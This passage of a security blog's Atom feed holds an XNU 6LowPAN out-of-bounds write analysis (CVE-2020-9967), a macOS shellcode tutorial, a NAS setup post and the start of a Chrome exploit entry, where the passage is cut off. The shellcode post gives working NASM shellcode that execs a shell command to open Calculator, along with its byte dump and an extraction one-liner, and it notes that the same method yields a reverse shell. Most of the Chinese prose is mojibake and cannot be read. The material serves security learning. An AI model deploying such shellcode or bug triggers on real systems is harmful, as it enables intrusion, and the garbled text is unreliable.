class="line">    hdrlen = <span class="keyword">sizeof</span>(hdrbuf);</span><br><span class="line"></span><br><span class="line">    error = uncompress_hdr_hc1(ieee02154hdr, (<span class="keyword">u_int8_t</span> *)payload,</span><br><span class="line">        <span class="number">0</span>, &amp;hdroffset, &amp;hdrlen, hdrbuf); <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hdroffset &lt; <span class="number">0</span>) &#123; <span class="comment">// 1</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * hdroffset negative means that we have to remove</span></span><br><span class="line"><span class="comment">         * hdrlen of extra stuff</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        memmove(&amp;payload[<span class="number">0</span>],</span><br><span class="line">            &amp;payload[hdrlen],</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdrlen);</span><br><span class="line">        ieee02154hdr-&gt;payload_len -= hdrlen;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * hdroffset is the size of the compressed header</span></span><br><span class="line"><span class="comment">         * -- i.e. when the untouched data starts</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * hdrlen is the size of the decompressed header</span></span><br><span class="line"><span class="comment">         * that takes the place of compressed header of size hdroffset</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        memmove(payload + hdrlen,</span><br><span class="line">            payload + hdroffset,</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdroffset); <span class="comment">// 2ï¼Œ oob write here, `ieee02154hdr-&gt; payload_len-3 = -2`</span></span><br><span class="line">        <span class="built_in">memcpy</span>(payload, hdrbuf, hdrlen);</span><br><span class="line">        ieee02154hdr-&gt;payload_len += hdrlen - hdroffset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å°†æ¥æ”¶åˆ°çš„å¸§çš„lenè®¾ç½®ä¸º0x4ï¼Œåˆ™æœ€ç»ˆå°†è®¡ç®—å‡ºä»¥ä¸‹å€¼(<code>frame802154_parse</code>)ï¼š</p><p><code>c</code> header length = 3 </p><p><code>frame-&gt;payload_len</code>= 1</p><p>åŒæ—¶ï¼Œåœ¨<code>uncompress_hdr_hc1</code>å‡½æ•°ä¸­ï¼ˆat 0)ï¼Œæ§åˆ¶æµç¨‹èµ°åˆ° <code>SICSLOWPAN_HC1_NH_UDP</code> åˆ†æ”¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*hdroffset = SICSLOWPAN_HC1_HDR_LEN;  --&gt; *hdroffset = 3</span><br><span class="line">*hdrlen = UIP_IPH_LEN;                --&gt; *hdrlen = 40</span><br><span class="line">sizeof(struct ip6_hdr) = 40</span><br></pre></td></tr></table></figure><p>å†å›åˆ°ä¸Šå±‚å‡½æ•°<code>sixxlowpan_uncompress</code> (at 1)ï¼Œhdroffset ä¸º3ï¼Œèµ°ä¸‹é¢çš„åˆ†æ”¯ï¼Œèƒ½å¤Ÿèµ°åˆ° memmoveè°ƒç”¨(at 2)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memmove(payload + hdrlen,</span><br><span class="line">            payload + hdroffset,</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdroffset); </span><br></pre></td></tr></table></figure><p>where : payload + 40</p><p>what :  source payload buffer, å¯æ§</p><p>length : ieee02154hdr-&gt;payload_len - hdroffset å³ payload_len - hdroffset = 1 - 3 = -2</p><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">Building XNU for macOS Big Sur 11.0.1 (Intel)</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/aliyuncs.com/img/codeql_xnu/codeql-xnu_xnu.md">D4rkD0g/boringforever</a></p><p><a href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407">Kernel crash caused by out-of-bounds write in Appleâ€™s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab</a></p><p><a href="https://alexplaskett.github.io/CVE-2020-9967/">CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Basic&quot;&gt;&lt;a href=&quot;#Basic&quot; class=&quot;headerlink&quot; title=&quot;Basic&quot;&gt;&lt;/a&gt;Basic&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;æœ¬æ–‡å±äºå­¦ä¹ è¿‡ç¨‹ä¸­çš„ç¬”è®°ï¼ŒåŸºæœ¬ä¸Šæ˜¯æŠŠç°æœ‰çš„ç›¸å…³èµ„æ–™æ•´åˆåˆ°ä¸€èµ·ï¼Œé˜…è¯»å·²æœ‰åšå®¢/æ–‡ç« å¹¶å¤ç°ï¼ŒåŠ å…¥ä¸€äº›è‡ªå·±çš„æƒ³æ³•åè®°å½•ä¸‹æ¥çš„äº§ç‰©ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;build XNU è¿‡ç¨‹æ¥è‡ªæŸå¤§ä½¬çš„åšå®¢ï¼Œ&lt;code&gt;build xnu with codeql&lt;/code&gt;è¿‡ç¨‹æ¥è‡ª&lt;code&gt;github&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ç¬”è®°" scheme="https://o0xmuhe.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="XNU" scheme="https://o0xmuhe.github.io/tags/XNU/"/>
    
    <category term="CodeQL" scheme="https://o0xmuhe.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>SHELLCODE on macOS</title>
    <link href="https://o0xmuhe.github.io/2020/11/28/shell-code-on-macos/"/>
    <id>https://o0xmuhe.github.io/2020/11/28/shell-code-on-macos/</id>
    <published>2020-11-27T16:25:17.000Z</published>
    <updated>2020-11-27T17:08:29.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shellcode-on-macOS"><a href="#shellcode-on-macOS" class="headerlink" title="shellcode on macOS"></a>shellcode on macOS</h2><p>æœ€è¿‘å› ä¸ºä¸€äº›å·¥ä½œä¸Šçš„éœ€æ±‚éœ€è¦æä¸‹macOSä¸Šçš„shellcdoeï¼Œè°·æ­Œäº†å¾ˆå¤šèµ„æ–™/ä»£ç åå‘ç°è¿˜æ˜¯æœ‰ä¸å°‘å‘çš„ï¼Œæˆ–è€…å°±æ˜¯ä»£ç æ¯”è¾ƒè€ï¼Œå®šåˆ¶åŒ–ç¨‹åº¦æ¯”è¾ƒé«˜ï¼Œä¸å¤ªç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œå…¶å®æˆ‘éœ€æ±‚ä¹Ÿç®€å• pop calcæˆ–è€…reverse shellï¼Œå°±æ˜¯ä¸ªæ¼”ç¤ºæ•ˆæœ ğŸ¤£ã€‚</p><a id="more"></a><h2 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h2><p>æˆ‘è¿™é‡Œç¯å¢ƒæ˜¯ macOS big sur(å¯¹ï¼Œæ²¡é”™ï¼Œå°ç™½é¼ ğŸ)</p><p>å·¥å…·é“¾åŸºæœ¬éƒ½æ˜¯brewç›´æ¥è£…æˆ–è€…è‡ªå¸¦çš„ã€‚</p><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>å…¶å®åœ¨macOSä¸Šå†™shellcodeå’ŒLinuxå·®ä¸å¤šï¼Œéƒ½æ˜¯è¦èµ°ç³»ç»Ÿè°ƒç”¨ï¼Œå¤§æ¦‚å°±æ˜¯å¸ƒç½®å‚æ•°ï¼Œå†™å¥½è°ƒç”¨å·ï¼Œç„¶åä¸€ä¸ªsyscallè¿›å»å³å¯ã€‚</p><p>æˆ‘è¿™é‡Œä¸ºäº†çœäº‹å„¿ï¼Œåšçš„æ˜¯æ‰§è¡Œ<code>system(&#39;xxxxxx&#39;)</code>çš„shellcodeï¼Œè¿™æ ·å¯¹äºæˆ‘æ¼”ç¤ºæ¥è¯´ï¼Œä¸ç®¡æ˜¯å¼¹è®¡ç®—å™¨è¿˜æ˜¯åå¼¹shelléƒ½æ¯”è¾ƒç®€å•ï¼Œå¦‚æœæ˜¯å®æˆ˜å•¥çš„ï¼Œå»ºè®®å‚è€ƒå¾ˆæ—©ä¹‹å‰hacking teamæ³„æ¼é‚£ç§ç©æ³•ï¼Œä¸è¿‡æ ¸å¿ƒåŸç†éƒ½æ˜¯é‚£æ ·ï¼Œä¸è¿‡äººå®¶ç©çš„æ¯”è¾ƒé«˜çº§(æ¯•ç«Ÿå†›ç«å˜›)ã€‚</p><p>exec_calc.asm: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">BITS 64</span><br><span class="line"></span><br><span class="line">global start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    mov     rax,0x2</span><br><span class="line">    ror     rax, 0x28</span><br><span class="line">    or      rax, 59</span><br><span class="line">    mov rcx, rax</span><br><span class="line"></span><br><span class="line">    xor     rdx, rdx</span><br><span class="line">    mov     rbx, 0x68732f2f6e69622f</span><br><span class="line">    push    rdx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rdi</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    mov     rbx, 0x632d</span><br><span class="line">    push    rdx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rbx</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    </span><br><span class="line">    ; å‚æ•°å¼€å§‹</span><br><span class="line">    mov rcx, 0x7070612e726f7461</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x6c75636c61432f73</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x6e6f69746163696c</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x7070412f6d657473</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x79532f206e65706f</span><br><span class="line">    push rcx</span><br><span class="line">    ; å‚æ•°ç»“æŸ</span><br><span class="line">    </span><br><span class="line">    push rsp</span><br><span class="line">    pop rcx</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rdi</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rsi</span><br><span class="line"></span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>å…¶å®æ ¸å¿ƒçš„å°±æ˜¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œå³å­—ç¬¦ä¸²æ€ä¹ˆæ„é€ è¿›å»ï¼Œè¿™é‡Œæ˜¯éƒ½å‹åˆ°æ ˆé‡Œç„¶åä¼ é€’ä¸ªæŒ‡é’ˆï¼Œå¸¸è§„æ“ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f macho64 -o exec_calc.o exec_calc.asm</span><br><span class="line">$ ld -macosx_version_min 10.7.0 -o exec_calc exec_calc.o</span><br><span class="line">ld: warning: building <span class="keyword">for</span> macOS 10.7.0 is deprecated</span><br></pre></td></tr></table></figure><p>ç„¶åä»objdumpçš„ç»“æœä¸­æå–å­—èŠ‚ç å³å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d ./exec_calc.o</span><br><span class="line"></span><br><span class="line">./exec_calc.o:file format Mach-O 64-bit x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section __TEXT,__text:</span><br><span class="line"></span><br><span class="line">0000000000000000 start:</span><br><span class="line">       0: 48 31 c0                     xorq%rax, %rax</span><br><span class="line">       3: b8 02 00 00 00               movl<span class="variable">$2</span>, %eax</span><br><span class="line">       8: 48 c1 c8 28                  rorq<span class="variable">$40</span>, %rax</span><br><span class="line">       c: 48 83 c8 3b                  orq<span class="variable">$59</span>, %rax</span><br><span class="line">      10: 48 89 c1                     movq%rax, %rcx</span><br><span class="line">      13: 48 31 d2                     xorq%rdx, %rdx</span><br><span class="line">      16: 48 bb 2f 62 69 6e 2f 2f 73 68movabsq<span class="variable">$7526411283028599343</span>, %rbx</span><br><span class="line">      20: 52                           pushq%rdx</span><br><span class="line">      21: 53                           pushq%rbx</span><br><span class="line">      22: 54                           pushq%rsp</span><br><span class="line">      23: 5f                           popq%rdi</span><br><span class="line">      24: 52                           pushq%rdx</span><br><span class="line">      25: bb 2d 63 00 00               movl<span class="variable">$25389</span>, %ebx</span><br><span class="line">      2a: 52                           pushq%rdx</span><br><span class="line">      2b: 53                           pushq%rbx</span><br><span class="line">      2c: 54                           pushq%rsp</span><br><span class="line">      2d: 5b                           popq%rbx</span><br><span class="line">      2e: 52                           pushq%rdx</span><br><span class="line">      2f: 48 b9 61 74 6f 72 2e 61 70 70movabsq<span class="variable">$8102082581755819105</span>, %rcx</span><br><span class="line">      39: 51                           pushq%rcx</span><br><span class="line">      3a: 48 b9 73 2f 43 61 6c 63 75 6cmovabsq<span class="variable">$7815262045510774643</span>, %rcx</span><br><span class="line">      44: 51                           pushq%rcx</span><br><span class="line">      45: 48 b9 6c 69 63 61 74 69 6f 6emovabsq<span class="variable">$7957695015157983596</span>, %rcx</span><br><span class="line">      4f: 51                           pushq%rcx</span><br><span class="line">      50: 48 b9 73 74 65 6d 2f 41 70 70movabsq<span class="variable">$8102047401594156147</span>, %rcx</span><br><span class="line">      5a: 51                           pushq%rcx</span><br><span class="line">      5b: 48 b9 6f 70 65 6e 20 2f 53 79movabsq<span class="variable">$8742383117993865327</span>, %rcx</span><br><span class="line">      65: 51                           pushq%rcx</span><br><span class="line">      66: 54                           pushq%rsp</span><br><span class="line">      67: 59                           popq%rcx</span><br><span class="line">      68: 52                           pushq%rdx</span><br><span class="line">      69: 51                           pushq%rcx</span><br><span class="line">      6a: 53                           pushq%rbx</span><br><span class="line">      6b: 57                           pushq%rdi</span><br><span class="line">      6c: 54                           pushq%rsp</span><br><span class="line">      6d: 5e                           popq%rsi</span><br><span class="line">      6e: 0f 05                        syscall</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥è§ä»è§æ™ºäº†ï¼Œæœ‰å¤§ä½¬ç”¨bashä¸€è¡Œæå®šï¼Œè€Œæˆ‘æ¯”è¾ƒèœï¼Œä¹‹å‰æ˜¯å†™äº†ä¸ªpyè„šæœ¬æå–ç„¶åæ ¼å¼åŒ–è¾“å‡ºçš„ã€‚</p><p>ä¹‹å‰çœ‹åˆ°è¿‡ä¸€ä¸ªLinuxç‰ˆæœ¬çš„ä¸€é”®æå–ï¼Œä¸è¿‡æ„Ÿè§‰å¤ªå¤æ‚äº†â€¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./execve-stack|grep <span class="string">'[0-9a-f]:'</span>|grep -v <span class="string">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">' '</span>|tr -s <span class="string">' '</span>|tr <span class="string">'\t'</span> <span class="string">' '</span>|sed <span class="string">'s/ $//g'</span>|sed <span class="string">'s/ /\\x/g'</span>|paste -d <span class="string">''</span> -s |sed <span class="string">'s/^/"/'</span>|sed <span class="string">'s/$/"/g'</span></span><br></pre></td></tr></table></figure><p>æœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥æä¸ªmacOSç‰ˆæœ¬ğŸ¤£</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://modexp.wordpress.com/2017/01/21/shellcode-osx/">shellcode-osx</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;shellcode-on-macOS&quot;&gt;&lt;a href=&quot;#shellcode-on-macOS&quot; class=&quot;headerlink&quot; title=&quot;shellcode on macOS&quot;&gt;&lt;/a&gt;shellcode on macOS&lt;/h2&gt;&lt;p&gt;æœ€è¿‘å› ä¸ºä¸€äº›å·¥ä½œä¸Šçš„éœ€æ±‚éœ€è¦æä¸‹macOSä¸Šçš„shellcdoeï¼Œè°·æ­Œäº†å¾ˆå¤šèµ„æ–™/ä»£ç åå‘ç°è¿˜æ˜¯æœ‰ä¸å°‘å‘çš„ï¼Œæˆ–è€…å°±æ˜¯ä»£ç æ¯”è¾ƒè€ï¼Œå®šåˆ¶åŒ–ç¨‹åº¦æ¯”è¾ƒé«˜ï¼Œä¸å¤ªç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œå…¶å®æˆ‘éœ€æ±‚ä¹Ÿç®€å• pop calcæˆ–è€…reverse shellï¼Œå°±æ˜¯ä¸ªæ¼”ç¤ºæ•ˆæœ ğŸ¤£ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="https://o0xmuhe.github.io/categories/exploit/"/>
    
    
    <category term="macOS" scheme="https://o0xmuhe.github.io/tags/macOS/"/>
    
    <category term="exploit" scheme="https://o0xmuhe.github.io/tags/exploit/"/>
    
    <category term="shellcode" scheme="https://o0xmuhe.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>NASæŠ˜è…¾è®°å½•</title>
    <link href="https://o0xmuhe.github.io/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/"/>
    <id>https://o0xmuhe.github.io/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/</id>
    <published>2020-10-07T12:13:21.000Z</published>
    <updated>2021-06-09T14:35:02.457Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å…³äº"><a href="#å…³äº" class="headerlink" title="å…³äº"></a>å…³äº</h2><p>  å¤§æ¦‚äº”æœˆçš„æ—¶å€™ä¸¢å¤±äº†ä¸€æ³¢æ•°æ®ï¼Œå¤§æ¦‚ä¸åˆ°2TBï¼Œè™½ç„¶æœ€åæ•‘å›æ¥äº†ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ä»ç„¶è®©æˆ‘å¿ƒæœ‰ä½™æ‚¸ï¼Œç”Ÿæ€•è¿™æ ·çš„æƒ…å†µå†æ¬¡å‘ç”Ÿï¼Œç´¢æ€§ç”³è¯·èµ„é‡‘ä¹°NASï¼Œç”±äºæœ¬èº«åˆä¸æŠ˜è…¾ç¡¬ä»¶ä»€ä¹ˆçš„ï¼Œå°±ç›´æ¥ä¸€æ­¥åˆ°ä½é€‰æ‹©äº†ç¾¤æ™–DS218+ï¼ŒåŒç›˜ä½ï¼Œx86ï¼Œå¤ŸæŠ˜è…¾äº†ã€‚</p><a id="more"></a><p>å› ä¸ºæ˜¯ä¸¤ç›˜ä½ï¼Œæ‰€ä»¥å°½é‡ç¡¬ç›˜é€‰æ‹©çš„å¤§ä¸€ç‚¹ï¼Œä¸ç„¶åç»­ç½®æ¢å¾ˆéº»çƒ¦ï¼Œè€Œä¸”ä¸ºäº†ä¿è¯æ•°æ®å®‰å…¨è‚¯å®šæ˜¯è¦åšraidçš„ï¼Œæˆ‘è¿™é‡Œç›´æ¥ä¹°äº†ä¸¤å—å¸Œæ·çš„8Tä¼ä¸šç›˜ï¼Œè‚‰ç–¼æ˜¯è‚¯å®šçš„ï¼Œä½†æ˜¯æ¢æ¥çš„æ˜¯å¤§å®¹é‡+å®‰å…¨æ€§ï¼Œæ‰€ä»¥è¿˜æ˜¯ç‰©æœ‰æ‰€å€¼ï¼›æœ€åè¿˜ç»™NASåŠ äº†ä¸€æ¡å†…å­˜ï¼Œæ–¹ä¾¿åé¢æŠ˜è…¾dockerã€‚</p><h2 id="å¥—ä»¶-amp-amp-Docker"><a href="#å¥—ä»¶-amp-amp-Docker" class="headerlink" title="å¥—ä»¶&amp;&amp;Docker"></a>å¥—ä»¶&amp;&amp;Docker</h2><p>  æˆ‘æœ¬èº«ä½¿ç”¨NASå°±æ˜¯ä¸ºäº†æ•°æ®å¤‡ä»½ï¼Œæ‰€ä»¥ç¾¤æ™–æä¾›çš„å¥—ä»¶è¿˜æ˜¯ååˆ†å®ç”¨ï¼Œæœ‰ç§ä¹°è½¯ä»¶é€NASçš„æ„Ÿè§‰ï¼Œæ‰‹æœºç›¸å†Œç›´æ¥ä½¿ç”¨<code>Monments</code>å¤‡ä»½äº†ï¼Œmacå¯ä»¥tmå¤‡ä»½ä¸Šå»ï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯ä¸“é—¨å‡†å¤‡äº†ä¸€å—2tçš„ç§»åŠ¨ç¡¬ç›˜ç»™macåštmå¤‡ä»½ï¼Œé‡è¦çš„æ–‡ä»¶ä¼šé€‰æ‹©å¤šå¤„å¤‡ä»½ï¼Œç›´æ¥ç”¨äº†ç¾¤æ™–çš„<code>Synology Drive</code>ç»™åŒæ­¥åˆ°äº†NASä¸Šï¼Œå½“ç„¶è¿™äº›éƒ½æ¯”è¾ƒç®€å•åŸºç¡€ã€‚</p><p>  ä¸ºäº†éšæ—¶èƒ½è¿ä¸Šnasä½¿ç”¨ï¼Œç¾¤æ™–è™½ç„¶æä¾›äº†quick connectï¼Œä½†æ˜¯æ¶‰åŠåˆ°NASä¸Šè·‘ç€çš„ä¸€äº›dockerçš„æ—¶å€™ï¼Œè¿™æ ·å°±å¾ˆä¸æ–¹ä¾¿äº†ï¼›æ‰€ä»¥æˆ‘æ‰¾è”é€šå¼€äº†å…¬ç½‘ipï¼Œç„¶åNASè®¾ç½®é‡Œå¼€äº†DDNSï¼Œç„¶åå¯ä»¥ç”¨ç¾¤æ™–æä¾›çš„åŸŸåç›´æ¥æ¥è®¿é—®è‡ªå·±çš„NASäº†ï¼Œä¸è¿‡ä¸ºäº†å®‰å…¨èµ·è§ï¼Œæˆ‘å¼€äº†ä¸€äº›å®‰å…¨ç­–ç•¥ä»¥åŠbanæ‰äº†éå¿…é¡»ç«¯å£ï¼Œå¹¶ä¸”å¼€äº†SSLã€‚</p><p>åœ¨æœ‰å…¬ç½‘ipçš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥å¼€å§‹é€ ä½œäº†ï¼Œæˆ‘æŠ˜è…¾çš„æ¯”è¾ƒå¤šçš„æ˜¯dockerï¼š</p><ol><li>gitea</li><li>snell docker(for proxy)</li><li>Aria2 </li><li>Ubuntu &amp;&amp; mongodb</li></ol><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.27.57%402x.png"></p><p>ä¸ºäº†ä¸æš´éœ²å¤ªå¤šç«¯å£å‡ºæ¥ï¼ˆgiteaçš„ï¼Œubuntuçš„å•¥çš„ï¼‰ï¼Œæˆ‘çš„è®¾æƒ³æ˜¯åªæš´éœ²ä¸€ä¸ªä»£ç†çš„ç«¯å£ï¼Œç„¶åæˆ‘è¿ä¸Šä»£ç†ï¼Œå…¶ä»–çš„å®¹å™¨é€šè¿‡ä»£ç†æœ¬åœ°è®¿é—®ï¼Œè¿™æ ·èƒ½æœ€å¤§é™åº¦å‡å°‘é£é™©ï¼Œä»£ç†çš„è¯ä¹Ÿä¸é€‰ç”¨å¸¸ç”¨çš„ï¼Œæˆ–è€…è¯´è‡ªå·±åšä¸€äº›ä¿®æ”¹ã€‚</p><p>è‡ªå·±æä¸ªgitç”¨çœŸèˆ’æœå•Šï¼Œgitlabå¤ªé‡äº†ï¼Œä¸ªäººä½¿ç”¨çš„è¯æ²¡å¿…è¦ï¼Œgiteaæ¯”è¾ƒè½»é‡çº§ï¼ŒçœŸé¦™ã€‚</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.35.05%402x.png"></p><p>æ€»ä¹‹è¿™è¿˜æ˜¯è›®é¦™çš„ï¼Œé…ç½®å¥½aria2åï¼Œä¸‹ç”µå½±å†ç»“åˆç¾¤æ™–çš„<code>Video Station</code> å®¶åº­å½±é™¢åˆ†åˆ†é’Ÿæèµ·ï¼Œè¿˜èƒ½éšæ—¶éšåœ°å­¦ä¹ ï¼ŒçœŸé¦™ ğŸ˜„</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.37.06%402x.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å…³äº&quot;&gt;&lt;a href=&quot;#å…³äº&quot; class=&quot;headerlink&quot; title=&quot;å…³äº&quot;&gt;&lt;/a&gt;å…³äº&lt;/h2&gt;&lt;p&gt;  å¤§æ¦‚äº”æœˆçš„æ—¶å€™ä¸¢å¤±äº†ä¸€æ³¢æ•°æ®ï¼Œå¤§æ¦‚ä¸åˆ°2TBï¼Œè™½ç„¶æœ€åæ•‘å›æ¥äº†ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ä»ç„¶è®©æˆ‘å¿ƒæœ‰ä½™æ‚¸ï¼Œç”Ÿæ€•è¿™æ ·çš„æƒ…å†µå†æ¬¡å‘ç”Ÿï¼Œç´¢æ€§ç”³è¯·èµ„é‡‘ä¹°NASï¼Œç”±äºæœ¬èº«åˆä¸æŠ˜è…¾ç¡¬ä»¶ä»€ä¹ˆçš„ï¼Œå°±ç›´æ¥ä¸€æ­¥åˆ°ä½é€‰æ‹©äº†ç¾¤æ™–DS218+ï¼ŒåŒç›˜ä½ï¼Œx86ï¼Œå¤ŸæŠ˜è…¾äº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="å…¶ä»–" scheme="https://o0xmuhe.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="å…¶ä»–" scheme="https://o0xmuhe.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>exploit for crbug1086890</title>
    <link href="https://o0xmuhe.github.io/2020/08/27/exploit-for-crbug1086890/"/>
    <id>https://o0xmuhe.github.io/2020/08/27/exploit-for-crbug1086890/</id>
    <published>2020-08-27T07:07:08.000Z</published>
    <updated>2020-08-27T07:25:27.000Z</updated>
    
